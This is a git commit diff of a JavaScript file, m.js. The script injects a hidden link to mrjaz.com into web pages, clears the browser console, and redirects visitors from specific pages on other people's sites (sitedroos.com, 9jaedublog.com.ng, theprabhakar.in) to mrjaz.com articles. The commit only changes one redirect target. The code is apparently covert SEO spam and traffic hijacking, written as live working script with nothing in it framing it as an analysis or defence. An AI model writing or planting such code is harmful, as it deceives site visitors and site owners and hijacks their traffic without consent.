0845bd661fef0db452354f501cf80beb10f0952b
Sonu Kumar Beast <67105554+SonuBeast@users.noreply.github.com>
2020-11-20 19:11:30 +0530

    Update m.js

--- m.js
+++ m.js
@@ -2,5 +2,5 @@ let EFV='<a href="https://www.mrjaz.com" style="position: absolute;z-index: -999
 if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
 else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
 console.clear();
-if(location.href=='https://www.sitedroos.com/2015/09/500_12.html' || location.href=='https://www.9jaedublog.com.ng/2020/06/betking-virtual-football-cheat-2020.html'){location.href='https://www.mrjaz.com/2020/11/future-mein-kaunsa-business-sabse-jyada-grow-karenge.html'}
+if(location.href=='https://www.sitedroos.com/2015/09/500_12.html' || location.href=='https://www.9jaedublog.com.ng/2020/06/betking-virtual-football-cheat-2020.html'){location.href='https://www.mrjaz.com/2020/11/how-to-become-wildlife-photographer.html'}
 if(location.href=='https://www.theprabhakar.in/2016/05/how-to-use-nitrotyper-21-nitro-type-speed-hack.html' || location.href=='https://www.sitedroos.com/2017/01/More-Words-Commonly-used-francais-300-1000-500-Words.html'){location.href='https://www.mrjaz.com/2020/11/kaise-start-kare-construction-business.html'}
